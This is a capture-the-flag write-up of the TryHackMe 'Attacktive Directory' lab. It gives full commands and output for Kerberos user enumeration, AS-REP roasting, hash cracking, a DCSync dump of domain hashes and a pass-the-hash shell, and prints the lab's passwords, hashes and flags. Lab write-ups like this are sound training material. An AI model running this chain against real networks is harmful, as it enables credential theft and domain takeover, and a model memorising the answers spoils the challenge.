# Attacktive Directory

> Platform: TryHackMe
>
> Created by: [tryhackme](https://tryhackme.com/p/tryhackme) and [l000g1c](https://tryhackme.com/p/l000g1c)
>
> Difficulty: Medium


## 🔍 Enumeration

Starting with enumeration, first I use the <code>Nmap</code> command to **list out the running services on the open ports**:
```
┌──(kali㉿kali)-[/mnt/…/Learning/TryHackMe/Machines/Attacktive Directory]
└─$ nmap -sVSC <MACHINE-IP> -T4 -Pn -n -vvv -oA adscan
Nmap scan report for <MACHINE-IP>
Host is up, received user-set (0.29s latency).
Scanned at 2025-09-03 12:16:51 +08 for 56s
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-09-03 04:17:14Z)
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 125
464/tcp  open  kpasswd5?     syn-ack ttl 125
593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 125
3268/tcp open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 125
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-03T04:17:32+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-02T04:15:53
| Not valid after:  2026-03-04T04:15:53
| MD5:   1b84:0bc5:6003:20e2:2439:2a4d:a1e6:f5aa
| SHA-1: 9143:338a:d190:afec:7db5:6cd3:c263:0ea4:4b14:2fd3
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQHGU5mkbqKbhMEo2RfmlPvzANBgkqhkiG9w0BAQsFADAu
| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe
| Fw0yNTA5MDIwNDE1NTNaFw0yNjAzMDQwNDE1NTNaMC4xLDAqBgNVBAMTI0F0dGFj
| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAz4wfkjv6nGoM++jm7h7cz1w7uUEqDUuX05bKaKKp/voY
| bkyEFyqNfO+vFslCF8coWYnSBZMhZc0uLGfuvPb25/8KwDfh3aiOzF+HEw5vFTty
| F4q32QpYvIZNY9xWl4vCuas+VyYd2TnWP3Jxwhau1L5XqZQBVaKBOJ/PREabBu7q
| FB5BEQ+9UmeX7Iqs2SKgfUQ9ItL8+tYtjZyolgkANGAhhoPpBeYVdstnu1Vo5tEQ
| 2vR/Xw9ELVHXCQ9lUsPoTdIjqIOOal4PGuAfCBtPwdSOVyyKIdPBbJWuNXW93OU6
| go3HdhAS+Ik2fKoqLEXj0OUQRM5+x6b1dpKvsxpCxQIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAEPt
| 81tQGAHTVoMupRNzGa/SI6G2S0T6Q6KVcZrD+WcZyFzcjjouV4EF/+LXWTQtzR4Z
| GetzvtZJmHM9u2WvMj/vAPBBF7e2wdM71eksPVoyPbKBdbnZmKC7hKmomxVCaKBp
| nzP05SbG+w7Wa431qU/yHjWdVqHIxNGNlJgpN8jR890T/2jOpP97pnN75TJz7m0R
| MEnw1qUnC8kkDysn/J54IedoD81eBceYODyb2V3Kkpjfwlv5YulsrIG+GxsEblL3
| Rpsi5lbeRTaP/j+SfJDpx7lmrETdLX6v1oikyottMzwxO4fXnA6/OA7Ia4ilH+Om
| BzPcIWuescogonMhn2E=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-03T04:17:40+00:00; +2s from scanner time.
5985/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-03T04:17:31
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 37366/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 17499/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58651/udp): CLEAN (Timeout)
|   Check 4 (port 32351/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

<details>
<summary><b>What tool will allow us to enumerate port 139/445?</b></summary>
<b><code>enum4linux</code></b>
</details><br>

<details>
<summary><b>What is the NetBIOS-Domain Name of the machine?</b></summary>
<b><code>THM-AD</code></b>
</details><br>

<details>
<summary><b>What invalid TLD do people commonly use for their Active Directory Domain?</b></summary>
<b><code>.local</code></b>
</details><br>

Next, we will move to **enumerate the users via Kerberos** by using the <code>Kerbrute</code>:
```
┌──(kali㉿kali)-[/mnt/…/Learning/TryHackMe/Machines/Attacktive Directory]
└─$ kerbrute userenum --dc <MACHINE-IP> -d spookysec.local userlist.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/03/25 - Ronnie Flathers @ropnop

2025/09/03 12:33:22 >  Using KDC(s):
2025/09/03 12:33:22 >   <MACHINE-IP>:88

2025/09/03 12:33:23 >  [+] VALID USERNAME:       james@spookysec.local
2025/09/03 12:33:29 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/09/03 12:33:36 >  [+] VALID USERNAME:       James@spookysec.local
2025/09/03 12:33:38 >  [+] VALID USERNAME:       robin@spookysec.local
2025/09/03 12:34:05 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/09/03 12:34:22 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/09/03 12:34:56 >  [+] VALID USERNAME:       backup@spookysec.local
2025/09/03 12:35:12 >  [+] VALID USERNAME:       paradox@spookysec.local
```

<details>
<summary><b>What command within Kerbrute will allow us to enumerate valid usernames?</b></summary>
<b><code>userenum</code></b>
</details><br>

<details>
<summary><b>What notable account is discovered? (These should jump out at you)</b></summary>
<b><code>svc-admin</code></b>
</details><br>

<details>
<summary><b>What is the other notable account is discovered? (These should jump out at you)</b></summary>
<b><code>backup</code></b>
</details><br>


## ⚔️ Exploitation

With the retrieved users, we can try to abuse a feature within Kerberos which is the **"Does not require Pre-Authentication"** privilege set to the user account by an attack method called <code>ASREPROASTING</code>. 

Retrieving Kerberos Tickets using **Impacket** tools called <code>GetNPUsers</code>:
```
┌──(kali㉿kali)-[/mnt/…/Learning/TryHackMe/Machines/Attacktive Directory]
└─$ python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile userskerb.txt -dc-ip <MACHINE-IP> -request -outputfile asrep.hashes
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f7a3593ebab137ba7f33da28f39e9c12$9b8da824e99edc6cd08c24cb958c86d1a488f50706a16c4e9079c55654e8808956cf99288dfd0f79c80eb7bbcb4917bd2ccc49251851b7ad2fdaa62a1d7cd9bc5f4099672f253d6be7553338a6a8f1bf9f55d5403f2e5875c0c0b101fb37e64b730089ec419b409410ce8209e0ec8e1cd6f9a2c125e638113ff7b15e16ff793e349f93771693fb17afb48e3f0e61d71c3a9e79eadafdcc8a6edce00643cc28f573530c0c22997af1edb376f84b5ffb67368fb68e99355a49555b9a06fa4a525af5837fe28413c996aea9da4df1ea21d7bb1568dcb75b772c8f93c1e425774a39ad4489aa9d2e97d6048836b408684b0a20a8
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

<details>
<summary><b>We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?</b></summary>
<b><code>svc-admin</code></b>
</details><br>

<details>
<summary><b>Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)</b></summary>
<b><code>Kerberos 5, etype 23, AS-REP</code></b>
</details><br>

<details>
<summary><b>What mode is the hash?</b></summary>
<b><code>18200</code></b>
</details><br>

Cracking the hash using <code>Hashcat</code>:
```
┌──(kali㉿kali)-[/mnt/…/Learning/TryHackMe/Machines/Attacktive Directory]
└─$ hashcat -m 18200 -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt
...
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f7a3593ebab137ba7f33da28f39e9c12$9b8da824e99edc6cd08c24cb958c86d1a488f50706a16c4e9079c55654e8808956cf99288dfd0f79c80eb7bbcb4917bd2ccc49251851b7ad2fdaa62a1d7cd9bc5f4099672f253d6be7553338a6a8f1bf9f55d5403f2e5875c0c0b101fb37e64b730089ec419b409410ce8209e0ec8e1cd6f9a2c125e638113ff7b15e16ff793e349f93771693fb17afb48e3f0e61d71c3a9e79eadafdcc8a6edce00643cc28f573530c0c22997af1edb376f84b5ffb67368fb68e99355a49555b9a06fa4a525af5837fe28413c996aea9da4df1ea21d7bb1568dcb75b772c8f93c1e425774a39ad4489aa9d2e97d6048836b408684b0a20a8:<svc-admin-PASSWORD>
...
```

<details>
<summary><b>Now crack the hash with the modified password list provided, what is the user accounts password?</b></summary>
<b><code>management2005</code></b>
</details><br>


## 🔍 Enumeration

Back again at the enumeration process. With the retrived credentials, we can try to **enumerate the <code>SMB</code> shares**:
```
┌──(kali㉿kali)-[/mnt/…/Learning/TryHackMe/Machines/Attacktive Directory]
└─$ smbclient -L //<MACHINE-IP>/ -U 'svc-admin'%'management2005'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to <MACHINE-IP> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

<details>
<summary><b>What utility can we use to map remote SMB shares?</b></summary>
<b><code>smbclient</code></b>
</details><br>

<details>
<summary><b>Which option will list shares?</b></summary>
<b><code>-L</code></b>
</details><br>

<details>
<summary><b>How many remote shares is the server listing?</b></summary>
<b><code>6</code></b>
</details><br>

Try to **enumerate more the shares**:
```
┌──(kali㉿kali)-[/mnt/…/Learning/TryHackMe/Machines/Attacktive Directory]
└─$ smbclient //<MACHINE-IP>/backup -U 'svc-admin'%'management2005' 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 03:08:39 2020
  ..                                  D        0  Sun Apr  5 03:08:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 03:08:53 2020

                8247551 blocks of size 4096. 3561007 blocks available
smb: \> get backup_credentials.txt
```

```
┌──(kali㉿kali)-[/mnt/…/Learning/TryHackMe/Machines/Attacktive Directory]
└─$ cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```

<details>
<summary><b>There is one particular share that we have access to that contains a text file. Which share is it?</b></summary>
<b><code>backup</code></b>
</details><br>

<details>
<summary><b>What is the content of the file?</b></summary>
<b><code>YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</code></b>
</details><br>

<details>
<summary><b>Decoding the contents of the file, what is the full contents?</b></summary>
<b><code>backup@spookysec.local:backup2517860</code></b>
</details><br>


## 💀 Privilege Escalation

Moving on to privilege escalation. With the retrieved credentials of the user <code>backup</code>, we can try to use another **Impacket** tools called <code>secretsdump</code>, which allow us to **retrieve all the password hashes that the current user <code>backup</code> has to offer**:
```
┌──(kali㉿kali)-[/mnt/…/Learning/TryHackMe/Machines/Attacktive Directory]
└─$ python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@<MACHINE-IP>
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
...
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
...
[*] Cleaning up... 
```

<details>
<summary><b>What method allowed us to dump NTDS.DIT?</b></summary>
<b><code>DRSUAPI</code></b>
</details><br>

<details>
<summary><b>What is the Administrators NTLM hash?</b></summary>
<b><code>0e0363213e37b94221497260b0bcb4fc</code></b>
</details><br>

<details>
<summary><b>What method of attack could allow us to authenticate as the user without the password?</b></summary>
<b><code>Pass The Hash</code></b>
</details><br>

<details>
<summary><b>Using a tool called Evil-WinRM what option will allow us to use a hash?</b></summary>
<b><code>-H</code></b>
</details><br>

```
┌──(kali㉿kali)-[/mnt/…/Learning/TryHackMe/Machines/Attacktive Directory]
└─$ evil-winrm -i <MACHINE-IP> -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```


## 🏳️ Flags

<details>
<summary><b>svc-admin</b></summary>
<b><code>TryHackMe{K3rb3r0s_Pr3_4uth}</code></b>
</details><br>

<details>
<summary><b>backup</b></summary>
<b><code>TryHackMe{B4ckM3UpSc0tty!}</code></b>
</details><br>

<details>
<summary><b>Administrator</b></summary>
<b><code>TryHackMe{4ctiveD1rectoryM4st3r}</code></b>
</details><br>